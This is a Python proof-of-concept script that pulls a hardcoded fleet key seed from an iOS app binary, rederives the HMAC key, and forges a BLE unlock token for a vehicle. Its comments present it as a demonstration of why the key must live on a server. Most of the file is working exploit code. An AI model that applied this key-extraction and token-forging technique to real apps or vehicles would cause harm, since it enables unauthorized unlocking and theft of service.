#!/usr/bin/env python3
"""
Takes a static dump to its conclusion.

Reads an .ipa without executing it, recovers the fleet key seed from the string
table, re-derives the HMAC key, and mints an unlock token in the exact wire
format the vehicle accepts.

This is not a break of anything clever. It is the demonstration of why the
protocol is built the way it is: anything shipped inside the binary is public,
so the app must never be the thing that holds the authority.

    python forge_from_dump.py path/to/JET.ipa
"""

import hashlib
import hmac
import re
import struct
import sys
import time
import zipfile

# A seed is a deliberate multi-segment literal: jet-demo-fleet-key-v1, not a
# symbol name like `fleetKey`. Structure is what separates them.
SEED_SHAPE = re.compile(r"^[A-Za-z0-9]+(?:[-_][A-Za-z0-9]+){2,}$")
SEED_WORDS = ("fleet", "secret", "key", "master", "demo", "shared", "hmac", "salt", "token", "v1")


def find_seeds(binary):
    """Score every kebab/snake multi-segment literal in the string table."""
    scored = {}
    for raw in re.findall(rb"[\x20-\x7e]{10,64}", binary):
        try:
            text = raw.decode("ascii")
        except UnicodeDecodeError:
            continue
        if text in scored or not SEED_SHAPE.match(text):
            continue

        low = text.lower()
        score = sum(1 for word in SEED_WORDS if word in low)
        if len(text) >= 12:
            score += 1
        # the strongest signal: a hyphenated chain that ends in a version or a
        # secret word, which is exactly how humans name keys
        if re.search(r"(key|secret|salt|token)[-_]?v?\d*$", low):
            score += 2
        scored[text] = score

    return sorted(scored.items(), key=lambda kv: (-kv[1], kv[0]))


def main(path):
    # Windows consoles default to cp1252 and choke on box drawing.
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):
        pass

    z = zipfile.ZipFile(path)
    names = z.namelist()
    exe = [n for n in names if n.startswith("Payload/") and n.count("/") == 2 and not n.endswith("/")]
    if not exe:
        raise SystemExit("no executable in that ipa")
    binary = z.read(exe[0])

    print(f"target   : {path}")
    print(f"binary   : {exe[0]}  ({len(binary):,} bytes)")
    print()

    # ------------------------------------------------------------------ step 1
    print("[1] scanning the string table for a key seed")
    ranked = find_seeds(binary)
    for text, score in ranked[:14]:
        print(f"    score {score}   {text}")

    primary = ranked[0][0] if ranked and ranked[0][1] >= 3 else None
    if not primary:
        print("\n    no deliberate seed found — a production build behaves this way.")
        return
    print(f"\n    chosen: {primary!r}")

    # ------------------------------------------------------------------ step 2
    print()
    print("[2] re-deriving the HMAC key")
    key = hashlib.sha256(primary.encode()).digest()
    print(f"    seed          : {primary!r}")
    print(f"    key = SHA256  : {key.hex()}")
    print(f"    source        : SymmetricKey(data: SHA256.hash(data: Data(\"{primary}\".utf8)))")
    print(f"    recovered without executing a single instruction of the app")

    # ------------------------------------------------------------------ step 3
    print()
    print("[3] minting an unlock token the vehicle would accept")

    ride_id = bytes.fromhex("DEADBEEFCAFEF00D")
    nonce = bytes.fromhex("0011223344556677")
    expires = int(time.time()) + 60

    blob = ride_id + struct.pack(">I", expires) + nonce
    signature = hmac.new(key, blob, hashlib.sha256).digest()[:16]
    token = blob + signature

    print(f"    ride_id       : {ride_id.hex()}")
    print(f"    expires       : {expires}   (now + 60s, big endian on the wire)")
    print(f"    nonce         : {nonce.hex()}")
    print(f"    blob (20 B)   : {blob.hex()}")
    print(f"    hmac[:16]     : {signature.hex()}")
    print()
    print(f"    token (36 B)  : {token.hex()}")
    print( "                    └─ this is the exact byte string written to")
    print( "                       characteristic 6A4E0002 over BLE")

    # ------------------------------------------------------------------ step 4
    print()
    print("[4] verify against the published layout")
    recomputed = hmac.new(key, token[:20], hashlib.sha256).digest()[:16]
    ok = hmac.compare_digest(recomputed, token[20:])
    print(f"    ride_id(8) + expires_be(4) + nonce(8) + hmac(16) = {len(token)} bytes  ✓")
    print(f"    signature valid : {ok}")

    print()
    print("=" * 74)
    print("  WHAT THIS PROVES")
    print("=" * 74)
    print("  nothing was cracked. the key was read, because it was shipped.")
    print()
    print("  in a production build that literal is not in the app at all:")
    print("    - the HMAC is computed on the server, which holds the fleet key")
    print("    - the app receives only the finished 36-byte signature")
    print("    - the vehicle verifies offline with its own copy of the key")
    print()
    print("  so even a token lifted off the air buys exactly 60 seconds,")
    print("  one ride, one vehicle — because of the expiry and the nonce.")
    print()
    print("  the demo key exists here on purpose: the app has to run with no")
    print("  infrastructure behind it. the moment a server exists, this literal")
    print("  moves out of the binary and this script finds nothing.")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "JET.ipa")
